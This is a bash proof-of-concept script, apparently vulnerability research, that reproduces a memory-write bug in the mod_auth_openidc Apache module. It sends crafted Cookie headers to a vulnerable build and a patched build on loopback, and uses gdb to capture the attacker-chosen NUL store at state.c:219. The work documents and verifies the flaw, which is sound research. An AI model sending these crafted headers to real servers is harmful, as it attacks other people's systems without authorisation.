#!/usr/bin/env bash
# W17: wire-chosen, in-bounds NUL store at pinned state.c:219 on the genuinely
# non-ASan full module (W15 stack). Loopback 127.0.0.1:18091 only. The second
# cookie's '=' is placed by the client at a chosen offset in the copied header;
# gdb observes the byte before and after the store. No shim, LD_PRELOAD or
# ASAN_OPTIONS. Fixed released-tag module is the control.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/usr/sbin/apache2
SRC="$HERE/src/mod_auth_openidc-sys/src/state.c"
VC="$HERE/httpd-sys-store.conf";        VERR="$HERE/error-sys-store.log"
FC="$HERE/httpd-sys-store-fixed.conf";  FERR="$HERE/error-sys-store-fixed.log"
URL=http://127.0.0.1:18091/protected
OUT="$HERE/evidence/sys-store"
mkdir -p "$OUT"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"

stop() {
  "$HTTPD" -f "$VC" -k stop >/dev/null 2>&1 || true
  "$HTTPD" -f "$FC" -k stop >/dev/null 2>&1 || true
  sleep 2
}
trap stop EXIT

sweep() {
  label="$1" conf="$2" err="$3"
  stop
  : > "$err"
  "$HTTPD" -f "$conf" -k start >"$OUT/$label-start.out" 2>&1 || true
  sleep 2
  : > "$OUT/$label-codes.txt"
  for n in 1 4 8 16 32; do
    pad=$(printf 'z%.0s' $(seq 1 "$n"))
    code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
      -H "Cookie: mod_auth_openidc_state_novalue;${pad}=V$n" \
      "$URL" 2>/dev/null || echo CURLERR)
    printf 'len=%s code=%s\n' "$n" "$code" >> "$OUT/$label-codes.txt"
  done
  stop
  cp "$err" "$OUT/$label-error.log"
  dispatch=$(grep -c 'oidc_state_cookies_process_one' "$OUT/$label-error.log" || true)
  parse=$(grep -c 'could not parse first element separated by' "$OUT/$label-error.log" || true)
  printf '%s dispatch=%s oob_value_peek=%s codes=%s\n' \
    "$label" "$dispatch" "$parse" "$(tr '\n' ',' < "$OUT/$label-codes.txt")"
}
capture() {
  n="$1"
  stop
  timeout 50 gdb -q -batch \
    -ex 'set pagination off' -ex 'set confirm off' -ex 'set breakpoint pending on' \
    -ex "break $SRC:219" \
    -ex "run -f $VC -X" \
    -ex 'printf "STORE=%p before=0x%02x\n", cookie, *(unsigned char*)cookie' \
    -ex 'x/112xb cookie-112' \
    -ex 'bt 8' \
    -ex 'next' \
    -ex 'printf "AFTER=%p after=0x%02x\n", cookie, *(unsigned char*)cookie' \
    --args "$HTTPD" >"$OUT/gdb-$n.txt" 2>&1 &
  gp=$!
  for i in $(seq 1 15); do
    ready=$(curl -sS --max-time 2 -o /dev/null -w '%{http_code}' "$URL" 2>/dev/null || true)
    [ "$ready" != "000" ] && break
    sleep 1
  done
  pad=$(printf 'z%.0s' $(seq 1 "$n"))
  code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
    -H "Cookie: mod_auth_openidc_state_novalue;${pad}=V$n" \
    "$URL" 2>/dev/null || echo CURLERR)
  sleep 2
  kill "$gp" >/dev/null 2>&1 || true
  wait "$gp" >/dev/null 2>&1 || true
  printf 'n=%s code=%s %s\n' "$n" "$code" \
    "$(grep -E 'STORE=|AFTER=' "$OUT/gdb-$n.txt" | tr '\n' ';')"
}

{
  echo "date: $(date -u +%FT%TZ)"
  echo "httpd: $(sha256sum "$HTTPD")"
  echo "vuln state.c: $(sha256sum "$SRC")"
  echo "vuln module:  $(sha256sum "$HERE/src/mod_auth_openidc-sys/src/.libs/mod_auth_openidc.so")"
  echo "fixed module: $(sha256sum "$HERE/src/mod_auth_openidc-sys-fixed/src/.libs/mod_auth_openidc.so")"
  echo "gdb: $(gdb --version | sed -n 1p)"
  echo "--- sweep ---"
  sweep vuln_bare_twocookie "$VC" "$VERR"
  sweep fixed_bare_twocookie "$FC" "$FERR"
  echo "--- gdb store capture ---"
  capture 8
  capture 32
} | tee "$OUT/summary.txt"
